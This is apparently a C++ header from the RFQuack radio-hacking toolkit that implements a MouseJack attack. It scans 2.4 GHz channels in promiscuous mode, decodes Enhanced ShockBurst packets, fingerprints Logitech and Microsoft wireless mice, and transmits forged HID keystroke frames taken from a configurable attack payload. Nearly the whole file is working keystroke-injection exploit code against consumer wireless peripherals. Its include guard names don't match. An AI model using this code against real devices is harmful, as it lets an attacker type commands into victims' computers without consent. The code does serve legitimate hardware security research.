#ifndef RFQUACK_PROJECT_SHOCKBURSTFILTERMODULE_H
#define RFQUACK_PROJECT_MOUSEJACKMODULE_H

#include "../RFQModule.h"
#include "../../rfquack_common.h"
#include "../../rfquack_radio.h"
#include "../hooks/AfterPacketReceived.h"

extern RFQRadio *rfqRadio; // Bridge between RFQuack and radio drivers.

class MouseJackModule : public RFQModule, public OnPacketReceived, public OnLoop {
private:

    enum PayloadType {
        MICROSOFT,
        MICROSOFT_ENCRYPTED,
        LOGITECH,
        UNKNOWN
    };

public:
    // NOTE: You can find original code at https://github.com/insecurityofthings/uC_mousejack

    MouseJackModule() : RFQModule("mouse_jack") {}

    virtual void onInit() {
      attack.size = 0;
      // Nothing to do :)
    }

    bool onPacketReceived(rfquack_Packet &pkt, rfquack_WhichRadio whichRadio) override {
      // Pay interest only to "our" packets.
      if (whichRadio != radioToUse) return true;

      // Check if we fished something good
      if (!isValidPayload(pkt.data.bytes)) {

        // Shift the payload and try again
        for (int x = 31; x >= 0; x--) {
          if (x > 0) pkt.data.bytes[x] = pkt.data.bytes[x - 1] << 7 | pkt.data.bytes[x] >> 1;
          else pkt.data.bytes[x] = pkt.data.bytes[x] >> 1;
        }

        // Do not store if packet is not valid
        if (!isValidPayload(pkt.data.bytes))
          return false;
      }

      uint8_t payload[32];
      uint8_t payload_size = pkt.data.bytes[5] >> 2;
      uint64_t address = 0;

      // Extract ESB address (first 5 bytes)
      for (int i = 0; i < 4; i++) {
        address += pkt.data.bytes[i];
        address <<= 8;
      }
      address += pkt.data.bytes[4];

      // Extract ESB payload
      for (uint8_t x = 0; x < payload_size + 3; x++)
        payload[x] = ((pkt.data.bytes[6 + x] << 1) & 0xFF) | (pkt.data.bytes[7 + x] >> 7);

      // Fingerprint the payload.
      PayloadType payload_type = fingerprint(payload_size, &payload[0]);
      if (payload_type == UNKNOWN) {
        RFQUACK_LOG_ERROR("Unknown payload type");
        return false;
      }
      if (payload_type != LOGITECH) {
        Log.error(F("Sorry, not implemented."));
        return false;
      }

      // Exit if no attack was configured.
      if (attack.size < 3)
        return false;

      // Enter TX
      rfqRadio->setMode(rfquack_Mode_IDLE, radioToUse);
      rfqRadio->setSyncWord(reinterpret_cast<uint8_t *>(&address), 5, radioToUse);
      rfqRadio->variablePacketLengthMode(32, radioToUse);
      rfqRadio->setAutoAck(true, radioToUse);
      rfqRadio->setMode(rfquack_Mode_TX, radioToUse);


      uint8_t meta = 0;
      uint8_t hid = 0;
      uint8_t wait = 0;
      int offset = 0;

      uint8_t keys2send[6];
      uint8_t keysLen = 0;

      int keycount = attack.size / 3;

      for (int i = 0; i <= keycount; i++) {
        offset = i * 3;
        meta = attack.bytes[offset];
        hid = attack.bytes[offset + 1];
        wait = attack.bytes[offset + 2];
        if (meta) {
          if (keysLen > 0) {
            log_transmit(0, keys2send, keysLen);
            keysLen = 0;
          }
          keys2send[0] = hid;
          log_transmit(meta, keys2send, 1);
          keysLen = 0;
        } else if (hid) {
          RFQUACK_LOG_TRACE("Hid code %d", hid)
          bool dup = false;
          for (int j = 0; j < keysLen; j++) {
            if (keys2send[j] == hid)
              dup = true;
          }
          if (dup) {
            log_transmit(meta, keys2send, keysLen);
            keys2send[0] = hid;
            keysLen = 1;
          } else if (keysLen == 5) {
            keys2send[5] = hid;
            keysLen = 6;
            log_transmit(meta, keys2send, keysLen);
            keysLen = 0;
          } else {
            keys2send[keysLen] = hid;
            keysLen++;
          }
        } else if (wait) {
          if (keysLen > 0) {
            log_transmit(meta, keys2send, keysLen);
            keysLen = 0;
          }
          delay(wait << 4);
        }
        if (i == keycount && keysLen > 0) {
          log_transmit(meta, keys2send, keysLen);
        }
      }

      // Go back in scan mode
      scanMode();

      return false;
    }


    void executeUserCommand(char *verb, char **args, uint8_t argsLen, char *messagePayload,
                            unsigned int messageLen) override {

      // Set radio to use for listening.
      CMD_MATCHES_WHICHRADIO("radioToUse",
                             "Which radio to use to listen for packets (default: 0 : RadioA)",
                             radioToUse)

      // Start mouse jack
      CMD_MATCHES_METHOD_CALL(rfquack_VoidValue, "start", "Starts Mouse Jack", start(reply))

      // Stop mouse jack
      CMD_MATCHES_METHOD_CALL(rfquack_VoidValue, "stop", "Stops Mouse Jack", stop(reply))

      CMD_MATCHES_BYTES("attack", "Attack payload", attack)

    }

    void start(rfquack_CmdReply &reply) {
      int16_t state = scanMode();

      if (state != ERR_NONE) {
        setReplyMessage(reply, F("Unable to setup radio, check logs."), state);
        return;
      }

      // Start scanning part.
      currFreq = 2402;
      lastHop = 0;
      this->enabled = true;
      if (attack.size < 3) {
        setReplyMessage(reply, F("Mousejack started but no attack is configured."));
      } else {
        setReplyMessage(reply, F("Mousejack started"));
      }
    }

    void stop(rfquack_CmdReply &reply) {
      this->enabled = false;

      // Stop promiscuous mode and enter IDLE.
      int16_t result = rfqRadio->setPromiscuousMode(false, radioToUse);
      result |= rfqRadio->setMode(rfquack_Mode_IDLE, radioToUse);

      setReplyMessage(reply, F("Mousejack stopped"), result);
    }

    void onLoop() override {
      if (millis() - lastHop > 100) {
        currFreq += 1;
        if (currFreq > 2484) {
          RFQUACK_LOG_TRACE(F("New frequency sweep"))
          currFreq = 2402;
        }

        // Change frequency
        rfqRadio->setFrequency(currFreq, radioToUse);
        lastHop = millis();
      }
    }

private:

    // Update a CRC16-CCITT with 1-8 bits from a given byte
    uint16_t crc_update(uint16_t crc, uint8_t byte, uint8_t bits) {
      crc = crc ^ (byte << 8);
      while (bits--)
        if ((crc & 0x8000) == 0x8000) crc = (crc << 1) ^ 0x1021;
        else crc = crc << 1;
      crc = crc & 0xFFFF;
      return crc;
    }

    uint16_t calculateCRC(byte *buf, uint8_t payload_length) {
      uint16_t crc = 0xFFFF;
      for (uint8_t x = 0; x < 6 + payload_length; x++) crc = crc_update(crc, buf[x], 8);
      crc = crc_update(crc, buf[6 + payload_length] & 0x80, 1);
      return (crc << 8) | (crc >> 8);
    }

    uint16_t crc_given;

    bool isValidPayload(byte *buf) {
      // With the "promiscuous" syncword we match the preamble consequently packet will start with:
      // [ Address 3-5 byte ] [ Payload Len 6 bit ] [ PID 2 bit ] [ No ACK 1 bit ][ Payload 0-32 byte ] [ 1-2 byte ]
      uint8_t payload_length = buf[5] >> 2;

      if (payload_length <= (32 - 9)) { // 32 payload - preamble, header, pcf, crc
        // Read the given CRC
        crc_given = (buf[6 + payload_length] << 9) | ((buf[7 + payload_length]) << 1);
        crc_given = (crc_given << 8) | (crc_given >> 8); // Swap synce lsbyte first.
        if (buf[8 + payload_length] & 0x80) {
          crc_given |= 0x100; // Put in place last bit which was left "outside".
        }

        // Calculate the CRC
        uint16_t crcCalculated = calculateCRC(buf, payload_length);
        if (crcCalculated == crc_given) {
          RFQUACK_LOG_TRACE(F("Packet found!"))
          return true;
        }

      } // payload_length acceptable
      return false;
    }


    PayloadType fingerprint(uint8_t payload_size, const uint8_t *payload) {
      PayloadType payload_type = UNKNOWN;
      if (payload_size == 19 && payload[0] == 0x08 && payload[6] == 0x40) {
        RFQUACK_LOG_TRACE(F("found MS mouse"));
        payload_type = MICROSOFT;
      }

      if (payload_size == 19 && payload[0] == 0x0a) {
        RFQUACK_LOG_TRACE(F("found MS encrypted mouse"));
        payload_type = MICROSOFT_ENCRYPTED;
      }

      if (payload[0] == 0) {
        if (payload_size == 10 && (payload[1] == 0xC2 || payload[1] == 0x4F))
          payload_type = LOGITECH;
        if (payload_size == 22 && payload[1] == 0xD3)
          payload_type = LOGITECH;
        if (payload_size == 5 && payload[1] == 0x40)
          payload_type = LOGITECH;
        if (payload_type == LOGITECH) {
          RFQUACK_LOG_TRACE(F("found Logitech mouse"))
        }
      }
      return payload_type;
    }

    void log_checksum(uint8_t payload_size, uint8_t *payload) {
      uint8_t cksum = 0xff;
      int last = payload_size - 1;
      for (int n = 0; n < last; n++)
        cksum -= payload[n];
      cksum++;
      payload[last] = cksum;
    }

    void transmit(uint8_t payload_size, uint8_t *payload) {
      rfquack_Packet pkt = rfquack_Packet_init_default;
      memcpy(pkt.data.bytes, payload, payload_size);
      pkt.data.size = payload_size;
      rfqRadio->transmit(&pkt, radioToUse);
    }

    void log_transmit(uint8_t meta, uint8_t keys2send[], uint8_t keysLen) {
      uint8_t payload[32];
      memset(payload, 0, 32);
      uint8_t payload_size = 10;

      // prepare key down frame
      payload[1] = 0xC1;
      payload[2] = meta;

      for (int q = 0; q < keysLen; q++) {
        payload[3 + q] = keys2send[q];
      }
      log_checksum(payload_size, payload);

      // send key down
      transmit(payload_size, payload);
      RFQUACK_LOG_TRACE(F("Key down transmitted"));
      delay(5);

      // prepare key up (null) frame
      payload[2] = 0;
      payload[3] = 0;
      payload[4] = 0;
      payload[5] = 0;
      payload[6] = 0;
      payload[7] = 0;
      payload[8] = 0;
      log_checksum(payload_size, payload);

      // send key up
      transmit(payload_size, payload);
      RFQUACK_LOG_TRACE(F("Key up transmitted"));
      delay(5);
    }

    int16_t scanMode() {
      // Enable promiscuous mode
      int16_t state = rfqRadio->setPromiscuousMode(true, radioToUse);

      // Set bitrate to 2M
      state |= rfqRadio->setBitRate(2000, radioToUse);

      // Start RX
      state |= rfqRadio->setMode(rfquack_Mode_RX, radioToUse);
      state |= rfqRadio->setFrequency(2400, radioToUse);
      return state;
    }

    rfquack_WhichRadio radioToUse = rfquack_WhichRadio_RadioA;
    uint16_t currFreq;
    uint32_t lastHop = 0;
    rfquack_BytesValue_value_t attack;
};

#endif //RFQUACK_PROJECT_MOUSEJACKMODULE_H